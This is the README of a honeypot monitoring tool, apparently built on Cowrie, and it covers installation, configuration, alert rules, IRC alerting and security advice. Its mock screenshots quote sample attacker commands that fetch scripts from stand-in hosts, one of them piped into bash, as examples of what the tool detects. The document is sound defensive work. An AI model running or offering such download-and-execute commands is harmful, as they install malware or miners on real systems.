# 🍯 CyberPot

**CyberPot** is an all-in-one honeypot monitoring system that integrates with [Cowrie](https://github.com/cowrie/cowrie), providing real-time security analysis through an interactive Terminal User Interface (TUI) and automated IRC alerting for research and threat intelligence.

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![Python](https://img.shields.io/badge/python-3.11+-green)
![License](https://img.shields.io/badge/license-MIT-orange)

## Features

### 🖥️ Terminal User Interface (TUI)
- **Real-time Event Feed** - Live stream of all honeypot activity
- **Interactive Dashboard** - Statistics, world map, top attackers
- **Session Viewer** - Detailed session information and TTY replay
- **Alert Management** - View and acknowledge security alerts
- **Search & Filter** - Query events by IP, command, session, etc.

### 🤖 IRC Bot Integration
- **Automated Alerting** - Send alerts to IRC channels in real-time
- **Rate Limiting** - Token bucket algorithm prevents flooding
- **Severity Filtering** - Configurable alert thresholds
- **Message Aggregation** - Batch alerts during high-volume periods
- **Command Interface** - Query statistics via IRC commands

### 📊 Security Analytics
- **GeoIP Enrichment** - Geographic location and ASN data
- **Threat Intelligence** - IP reputation via blocklists and GreyNoise
- **Command Classification** - Categorize attacker behavior
- **Pattern Detection** - Brute force, reconnaissance, persistence attempts
- **Session Correlation** - Track multi-stage attacks

### 🎯 Alert Rules
- Configurable YAML-based rules
- Count-based triggers (e.g., 5 failed logins)
- Pattern matching for commands
- GeoIP-based rules
- Severity levels: INFO, LOW, MEDIUM, HIGH, CRITICAL

## Architecture

```
┌─────────────┐
│   Cowrie    │ Honeypot generates JSON logs
│  Honeypot   │
└──────┬──────┘
       │
       │ cowrie.json
       ▼
┌─────────────────────────────────────────┐
│           CyberPot Monitor              │
│  ┌───────────────────────────────────┐  │
│  │  Log Watcher & Parser             │  │
│  └───────────┬───────────────────────┘  │
│              │                           │
│              ▼                           │
│  ┌───────────────────────────────────┐  │
│  │  Enrichment Engine                │  │
│  │  • GeoIP Lookup                   │  │
│  │  • Threat Intel                   │  │
│  │  • Command Classification         │  │
│  └───────────┬───────────────────────┘  │
│              │                           │
│              ▼                           │
│  ┌───────────────────────────────────┐  │
│  │  Alert Manager                    │  │
│  │  • Rule Evaluation                │  │
│  │  • Correlation                    │  │
│  │  • Deduplication                  │  │
│  └───────────┬───────────────────────┘  │
│              │                           │
│              ▼                           │
│  ┌──────────────────┬─────────────────┐ │
│  │                  │                 │ │
│  ▼                  ▼                 │ │
│ ┌────┐          ┌──────┐             │ │
│ │TUI │          │ IRC  │             │ │
│ │App │          │ Bot  │             │ │
│ └────┘          └──────┘             │ │
│                                       │ │
│  Memory Store • Statistics Aggregator │ │
└───────────────────────────────────────┘
```

## Quick Start

### Option 1: Automated Installation (Recommended)

```bash
git clone https://github.com/yourusername/cyberpot.git
cd cyberpot
chmod +x scripts/setup.sh
./scripts/setup.sh
```

The setup script will:
- Install system dependencies
- Install Cowrie honeypot
- Install CyberPot and dependencies
- Download GeoIP database
- Download threat intelligence blocklists
- Create example configuration

### Option 2: Docker Compose

```bash
git clone https://github.com/yourusername/cyberpot.git
cd cyberpot

# Download data
./scripts/download_geoip.sh
./scripts/download_blocklists.sh

# Configure
cp config/cyberpot.example.yaml config/cyberpot.yaml
# Edit config/cyberpot.yaml

# Start
docker-compose up -d
```

See [docker/README.md](docker/README.md) for detailed Docker instructions.

### Option 3: Manual Installation

#### Prerequisites
- Python 3.11+
- Cowrie honeypot installed
- Git

#### Install

```bash
# Clone repository
git clone https://github.com/yourusername/cyberpot.git
cd cyberpot

# Create virtual environment
python3 -m venv venv
source venv/bin/activate

# Install CyberPot
pip install -e .

# Download GeoIP database
./scripts/download_geoip.sh

# Download blocklists
./scripts/download_blocklists.sh

# Create configuration
cp config/cyberpot.example.yaml config/cyberpot.yaml
# Edit config/cyberpot.yaml
```

## Configuration

### Main Configuration (`config/cyberpot.yaml`)

```yaml
cowrie:
  log_path: "/opt/cowrie/var/log/cowrie/cowrie.json"

storage:
  max_events: 10000
  max_sessions: 5000
  max_alerts: 1000

enrichment:
  geoip:
    enabled: true
    database_path: "data/geoip/GeoLite2-City.mmdb"

  threat_intel:
    enabled: true
    blocklist_paths:
      - "data/blocklists/combined.txt"
    greynoise_api_key: ""  # Optional

irc:
  enabled: true
  server: "irc.libera.chat"
  port: 6667
  nickname: "cyberpot"
  channels:
    - "#cyberpot"

  alerts:
    rate_limit:
      max_per_minute: 10
      burst: 3
    severity_filter:
      enabled: true
      min_severity: "MEDIUM"
```

### Alert Rules (`config/alert_rules.yaml`)

```yaml
rules:
  - name: "brute_force_login"
    description: "Multiple failed login attempts"
    severity: "HIGH"
    event_types:
      - "LOGIN_FAILED"
    count: 5
    time_window: 60

  - name: "malware_download"
    description: "File download detected"
    severity: "CRITICAL"
    event_types:
      - "FILE_DOWNLOAD"
```

See [config/alert_rules.yaml](config/alert_rules.yaml) for complete examples.

## Usage

### Start CyberPot (TUI Mode)

```bash
source venv/bin/activate
python -m cyberpot start --mode tui
```

**TUI Keybindings:**
- `F1` - Dashboard
- `F2` - Sessions
- `F3` - Search
- `F4` - Alerts
- `R` - Refresh
- `Q` - Quit

### Start CyberPot (Headless Mode)

For running in background with IRC bot only:

```bash
python -m cyberpot start --mode headless
```

### Validate Configuration

```bash
python -m cyberpot validate-config --config config/cyberpot.yaml
```

### Check Dependencies

```bash
python -m cyberpot check-dependencies
```

## Screenshots

### Dashboard View
```
╭─ Live Events ────────────────────────────────────╮
│ 🔒 192.168.1.100:54321 → LOGIN_FAILED            │
│    Username: root, Password: admin               │
│    Location: United States (AS7922)              │
│                                                   │
│ $ 10.0.0.50:41234 → COMMAND_EXECUTION            │
│    Command: wget http://evil.com/malware.sh      │
│    Location: China (AS4134) ⚠️ Known Malicious   │
╰──────────────────────────────────────────────────╯

╭─ Statistics ──────────────────────────────────────╮
│ Events:   1,234    Sessions:     89               │
│ Alerts:      42    Rate: 12.3/min                │
╰──────────────────────────────────────────────────╯

╭─ World Map ──────────────────────────────────────╮
│         ░░░░                                      │
│    ░░░░ █▓▒░       ▓▓▓                          │
│    ░░░░░           ▓▓▓▓                          │
│                     ░░                            │
│           ▓                    ██                │
╰──────────────────────────────────────────────────╯
```

### IRC Alerts
```
<cyberpot> 🚨 [CRITICAL] Successful login to honeypot
<cyberpot>    IP: 192.168.1.50 (CN, AS4134 Chinanet)
<cyberpot>    User: root:password123
<cyberpot>    Session: a1b2c3d4-e5f6-7890

<cyberpot> 🔴 [HIGH] Suspicious command execution
<cyberpot>    IP: 10.0.0.100
<cyberpot>    Command: curl http://malware.site/miner.sh | bash
```

## Development

### Project Structure

```
cyberpot/
├── src/cyberpot/
│   ├── core/              # Core event processing
│   │   ├── models.py      # Data models
│   │   ├── log_watcher.py # Log file monitoring
│   │   ├── log_parser.py  # Cowrie JSON parser
│   │   ├── enrichment.py  # Data enrichment
│   │   └── alert_manager.py # Alert rules & correlation
│   ├── storage/           # In-memory storage
│   │   ├── memory_store.py
│   │   └── statistics.py
│   ├── analysis/          # Enrichment providers
│   │   ├── geoip.py
│   │   └── threat_intel.py
│   ├── tui/               # Terminal UI
│   │   ├── app.py
│   │   ├── screens/
│   │   └── widgets/
│   ├── irc/               # IRC bot
│   │   ├── bot.py
│   │   ├── formatter.py
│   │   ├── rate_limiter.py
│   │   └── severity_filter.py
│   └── config.py          # Configuration
├── scripts/               # Setup scripts
├── config/                # Configuration files
├── tests/                 # Test suite
└── docker/                # Docker setup
```

### Running Tests

```bash
source venv/bin/activate
pytest
```

With coverage:

```bash
pytest --cov=cyberpot --cov-report=html
```

### Code Quality

```bash
# Format code
black src/ tests/

# Lint
ruff check src/ tests/

# Type checking
mypy src/
```

## Threat Intelligence Sources

CyberPot integrates multiple threat intelligence sources:

- **Feodo Tracker** - Botnet C2 servers
- **EmergingThreats** - Compromised IPs
- **Blocklist.de** - SSH attackers & brute force
- **CI Army** - Known malicious IPs
- **Talos Intelligence** - Cisco threat intelligence
- **Spamhaus DROP** - Do Not Route Or Peer list
- **GreyNoise** (optional) - Internet scanner classification

Update blocklists regularly:

```bash
./scripts/download_blocklists.sh
```

## Performance

- **Memory Usage**: ~100-200 MB baseline
- **CPU Usage**: <5% average, spikes during high attack volume
- **Event Processing**: 1,000+ events/second
- **Storage**: Bounded ring buffers prevent memory leaks

Tune via `config/cyberpot.yaml`:

```yaml
storage:
  max_events: 10000     # Adjust based on available RAM
  max_sessions: 5000
  max_alerts: 1000
```

## Security Considerations

⚠️ **Important Security Notes:**

1. **Isolation**: Run honeypot in isolated network/VLAN
2. **Firewall**: Restrict outbound connections from honeypot
3. **Monitoring**: Monitor honeypot host for compromise attempts
4. **Legal**: Understand legal implications in your jurisdiction
5. **Data Handling**: Sanitize logs before sharing publicly
6. **Malware**: Handle downloaded files in sandboxed environment

## Troubleshooting

### No events showing up

1. Check Cowrie is running and generating logs:
   ```bash
   tail -f /opt/cowrie/var/log/cowrie/cowrie.json
   ```

2. Verify log path in config:
   ```yaml
   cowrie:
     log_path: "/opt/cowrie/var/log/cowrie/cowrie.json"
   ```

3. Check CyberPot logs:
   ```bash
   python -m cyberpot start --log-level DEBUG
   ```

### GeoIP enrichment not working

1. Verify database exists:
   ```bash
   ls -la data/geoip/GeoLite2-City.mmdb
   ```

2. Re-download if missing:
   ```bash
   ./scripts/download_geoip.sh
   ```

### IRC bot not connecting

1. Check IRC configuration:
   ```yaml
   irc:
     enabled: true
     server: "irc.libera.chat"
     port: 6667
   ```

2. Test connection manually:
   ```bash
   telnet irc.libera.chat 6667
   ```

3. Check firewall rules for outbound IRC connections

## Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Add tests
5. Submit a pull request

## License

MIT License - see LICENSE file for details

## Credits

- **Cowrie Honeypot**: https://github.com/cowrie/cowrie
- **Textual TUI Framework**: https://github.com/Textualize/textual
- **MaxMind GeoIP**: https://dev.maxmind.com/geoip/
- **GreyNoise**: https://www.greynoise.io/

## Support

- **Issues**: https://github.com/yourusername/cyberpot/issues
- **Discussions**: https://github.com/yourusername/cyberpot/discussions

## Roadmap

- [ ] Database persistence (SQLite/PostgreSQL)
- [ ] Web dashboard
- [ ] Slack/Discord integration
- [ ] Machine learning for anomaly detection
- [ ] Multi-honeypot support
- [ ] Export to SIEM formats
- [ ] REST API
- [ ] Grafana/Prometheus integration

---

**Made with 🐍 Python and ❤️ for security research**
